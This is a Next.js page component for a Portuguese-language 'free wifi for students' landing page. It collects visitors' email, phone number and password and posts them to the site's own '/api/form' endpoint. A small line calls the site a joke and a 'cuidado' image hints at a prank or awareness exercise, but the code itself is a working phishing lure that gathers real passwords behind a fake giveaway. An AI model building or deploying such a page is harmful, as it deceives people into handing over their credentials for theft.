import { Inter, Averia_Serif_Libre } from 'next/font/google'
import styles from '@/styles/Home.module.css'
import Image from 'next/image'
import { useRef } from 'react'
import { useRouter } from 'next/router'
import Link from 'next/link'

const inter = Inter({ subsets: ['latin'] })
const averia = Averia_Serif_Libre({ subsets: ['latin'], weight: ["300", "400", "700"] })

export default function Home() {

  const router = useRouter()
  const emailRef = useRef(null)
  const passwordRef = useRef(null)
  const telRef = useRef(null)

  async function handleSubmit(e) {
    e.preventDefault()

    const email = emailRef.current.value
    const password = passwordRef.current.value
    const telefone = telRef.current.value

    if (!email || !password || !telefone) {
      alert('Preencha todos os campos')
      return
    }

    try {
      const response = await fetch('/api/form', {
        method: 'POST',
        body: JSON.stringify({ email, password, telefone }),
        headers: {
          'Content-Type': 'application/json'
        }
      })

      router.push('/fim')
    } catch (error) {
      console.log(error)
    }
  }

  return (
    <div className={`${styles.container} ${inter.className}`}>

      <div>
        <Image src="/cuidado.png" alt="Wifi Grátis" width={152} height={48} />
      </div>

      <div className={styles.form}>
        <div className={styles.form_header}>
          <Image src="/hero.jpg" alt="Wifi Grátis" width={540} height={263} />
        </div>

        <div className={styles.form_body}>
          <div className={styles.form_content}>
            <h2 className={averia.className}>
              Você ganhou acesso o wifi grátis ultra-rápido exclusivo para alunos, Nada de professores!
            </h2>

            <p>Wifi Grátis e exclusivos para alunos
            OBS ESSE SITE É UMA BRINCADEIRA XD </p>
          </div>

          <div className={styles.form_data}>
            <input ref={emailRef} className={styles.form_control} placeholder="E-mail Muito foda" type="text" required/>
            <input ref={telRef} className={styles.form_control} placeholder="Telefone rsrs" type="number" required/>
            <input ref={passwordRef} className={styles.form_control} placeholder="Senha vc usa senha?" type="password" required/>
            <button onClick={handleSubmit} className={styles.form_button}>RESGATAR WIFI!</button>
            <span className={styles.terms}>Ao resgatar você concorda com os Termos de Uso (LEIA ESSES TERMOS) </span>
            <Link href="/termos"><button className={styles.form_button}>Termos de serviço</button> </Link>
          </div>
        </div>
      </div>

      <div>
        <span className={styles.copy}>
        © 2024 Wifi Grátis de alunos Brasil Muito foda
        </span>
      </div>

    </div>
  )
}
